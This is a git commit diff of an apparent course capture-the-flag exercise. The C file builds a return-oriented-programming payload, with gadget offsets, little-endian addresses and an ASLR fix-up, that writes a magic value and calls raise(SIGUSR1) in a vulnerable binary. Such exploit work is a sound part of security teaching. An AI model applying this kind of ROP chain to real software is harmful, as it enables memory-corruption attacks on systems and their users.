860ced33254c071c7be43315e212f515591fa3bb
ebielawa <edward_bielawa@brown.edu>
2022-11-06 20:41:22 -0500

    Flag 4 Test

--- ctf-3/exp5-flag3.c
+++ ctf-3/exp5-flag3.c
@@ -21,16 +21,10 @@
 #define RET_ADDR1_OFF 0x0000004c
 #define DATA1_OFF (RET_ADDR1_OFF + 4)
 #define RET_ADDR2_OFF (DATA1_OFF + 4)
-#define DATA2_OFF (RET_ADDR2_OFF + 4)
-#define RET_ADDR3_OFF (DATA2_OFF + 4)
+#define RET_ADDR3_OFF (RET_ADDR2_OFF + 8)
 #define RET_ADDR4_OFF (RET_ADDR3_OFF + 4)
-#define RET_ADDR5_OFF (RET_ADDR5_OFF + 4)
-#define RET_ADDR6_OFF (RET_ADDR5_OFF + 4)
-#define DATA3_OFF (RET_ADDR6_OFF + 4)
-#define RET_ADDR7_OFF (RET_ADDR6_OFF + 4)
-#define RET_ADDR8_OFF (RET_ADDR7_OFF + 4)
-#define DATA4_OFF (RET_ADDR8_OFF + 4)
-#define RET_ADDR9_OFF (DATA4_OFF + 4)
+#define DATA2_OFF (RET_ADDR4_OFF + 4)
+#define RET_ADDR5_OFF (DATA2_OFF + 4)
 
 // Debugging offsets
 #define LEAK_OFF 0x000015c4
@@ -41,16 +35,13 @@
 #define MGK1_OFF 0x00005008
 #define MGK2_OFF 0x0000500c
 #define RND1_OFF 0x00004004
-#define RND2_OFF 0x00004008
+#define RND2_ODD 0x00004008
 
 // Gadget offsets:
 #define POP_EDX_OFF 0x0000124f
 #define POP_EBX_OFF 0x0000101e
 #define MOV_INDIR_EBX_EDX_OFF 0x0000125f
 #define RAISE_PLT_OFF 0x00001030
-#define MOV_EBX_EBX_OFF 0x0000123f
-#define MOV_EDX_EDX_OFF 0x0000126f
-#define ADD_EDX_EBX_OFF 0x0000127f
 
 unsigned char payload[] =
 	/* ------------------------------------	*/
@@ -60,21 +51,16 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	/* FIXME */
 	/* ------------------------------------	*/
-	"\x1e\x90\x04\x08"		// Address of pop ebx gadget (0x0804901e)
-	"\x04\xa0\x88\x0c"		// Address of rnd1
-	"\x38\x71\x88\x0c"		// Address of pop edx gadget (0x0c887138)
-	"\x08\xa0\x88\x0c"		// Address of rnd2
-	"\x28\x71\x88\x0c"		// Address of mov [ebx] into ebx (0x0c887128)
-	"\x58\x71\x88\x0c"		// Address of mov [edx] into edx (0x0c887158)
-	"\x68\x71\x88\x0c"		// Address of add edx to ebx (0x0c887168)
-	"\x38\x71\x88\x0c"		// Address of pop edx gadget (0x0c887138)
-	"\x0c\xb0\x88\x0c"		// Address of mgk2
+	"\x38\x71\x88\x0c"		// Address of pop edx gadget
+	"\x08\xb0\x88\x0c"		// Address of magic
+	"\x1e\x90\x04\x08"		// Address of pop ebx gadget
+	"\xed\xac\xef\x0d"		// 0x0defaced (in little endian)
 	"\x48\x71\x88\x0c"		// Address of mov ebx to [edx] (0x0c887148)
 	"\x1e\x90\x04\x08"		// Address of pop ebx gadget
 	"\xef\xbe\xad\xde"		// Address of GOT table (for raise)
 	"\x30\x90\x04\x08"		// Address of raise in .plt (0x08049030)
 	"\xef\xbe\xad\xde"		// DEADBEEF (extra return address)
-	"\x0c\x00\x00\x00";		// SIGUSR1
+	"\x0a\x00\x00\x00";		// SIGUSR1
 	/* ------------------------------------	*/
 
 
@@ -116,32 +102,20 @@ main(int argc, char **argv)
 	}
 
 	/* fix the payload			*/
-	addr_aslr = baddr + POP_EBX_OFF;
+	addr_aslr = baddr + POP_EDX_OFF;
 	memcpy(payload + RET_ADDR1_OFF, &addr_aslr, sizeof(addr_aslr));
-	addr_aslr = baddr + RND1_OFF;
+	addr_aslr = baddr + MGK1_OFF;
 	memcpy(payload + DATA1_OFF, &addr_aslr, sizeof(addr_aslr));
-	addr_aslr = baddr + POP_EDX_OFF;
-	memcpy(payload + RET_ADDR2_OFF, &addr_aslr, sizeof(addr_aslr));
-	addr_aslr = baddr + RND2_OFF;
-	memcpy(payload + DATA2_OFF, &addr_aslr, sizeof(addr_aslr));
-	addr_aslr = baddr + MOV_EBX_EBX_OFF;
-	memcpy(payload + RET_ADDR3_OFF, &addr_aslr, sizeof(addr_aslr));
-	addr_aslr = baddr + MOV_EDX_EDX_OFF;
-	memcpy(payload + RET_ADDR4_OFF, &addr_aslr, sizeof(addr_aslr));
-	addr_aslr = baddr + ADD_EDX_EBX_OFF;
-	memcpy(payload + RET_ADDR5_OFF, &addr_aslr, sizeof(addr_aslr));
-	addr_aslr = baddr + POP_EDX_OFF;
-	memcpy(payload + RET_ADDR6_OFF, &addr_aslr, sizeof(addr_aslr));
-	addr_aslr = baddr + MGK2_OFF;
-	memcpy(payload + DATA3_OFF, &addr_aslr, sizeof(addr_aslr));
-	addr_aslr = baddr + MOV_INDIR_EBX_EDX_OFF;
-	memcpy(payload + RET_ADDR7_OFF, &addr_aslr, sizeof(addr_aslr));
 	addr_aslr = baddr + POP_EBX_OFF;
-	memcpy(payload + RET_ADDR8_OFF, &addr_aslr, sizeof(addr_aslr));
+	memcpy(payload + RET_ADDR2_OFF, &addr_aslr, sizeof(addr_aslr));
+	addr_aslr = baddr + MOV_INDIR_EBX_EDX_OFF;
+	memcpy(payload + RET_ADDR3_OFF, &addr_aslr, sizeof(addr_aslr));
+	addr_aslr = baddr + POP_EBX_OFF;
+	memcpy(payload + RET_ADDR4_OFF, &addr_aslr, sizeof(addr_aslr));
 	addr_aslr = baddr + GOT_OFF;
-	memcpy(payload + DATA4_OFF, &addr_aslr, sizeof(addr_aslr));
+	memcpy(payload + DATA2_OFF, &addr_aslr, sizeof(addr_aslr));
 	addr_aslr = baddr + RAISE_PLT_OFF;
-	memcpy(payload + RET_ADDR9_OFF, &addr_aslr, sizeof(addr_aslr));
+	memcpy(payload + RET_ADDR5_OFF, &addr_aslr, sizeof(addr_aslr));
 
 	/*
 	 * dump the payload in 'stdout'
